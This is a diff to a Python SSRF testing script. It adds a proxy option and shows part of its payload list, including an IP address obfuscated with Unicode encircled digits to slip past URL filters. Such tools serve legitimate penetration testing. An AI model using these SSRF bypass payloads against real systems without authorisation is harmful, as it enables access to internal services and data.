@@ -16,15 +16,19 @@ def is_private_ip(ip):
     except ValueError:
         return False
 
-def test_ssrf(url, payloads):
+def test_ssrf(url, payloads, proxy):
     headers = {
         'User-Agent': 'SSRF-Tester',
+    }
+    proxies = {
+        'http': proxy,
+        'https': proxy,
     }
     
     for payload in payloads:
         target_url = url.replace('@@', payload)
         try:
-            response = requests.get(target_url, headers=headers, timeout=10)
+            response = requests.get(target_url, headers=headers, proxies=proxies, timeout=10)
             print(f"[*] Testing payload: {payload}")
             print(f"[+] Response status: {response.status_code}")
             
@@ -43,6 +47,7 @@ def test_ssrf(url, payloads):
 def main():
     parser = argparse.ArgumentParser(description='SSRF Testing Tool')
     parser.add_argument('-u', '--url', required=True, help='Target URL with @@ as placeholder')
+    parser.add_argument('-p', '--proxy', default='http://localhost:8080', help='Proxy server to use (default: http://localhost:8080)')
     args = parser.parse_args()
 
     payloads = [
@@ -88,7 +93,7 @@ def main():
         'http://⓪⓪②⑤①｡⓪ⓧⓕⓔ｡④③⑤①⑧:80/',
     ]
 
-    test_ssrf(args.url, payloads)
+    test_ssrf(args.url, payloads, args.proxy)
 
 if __name__ == "__main__":
     main()
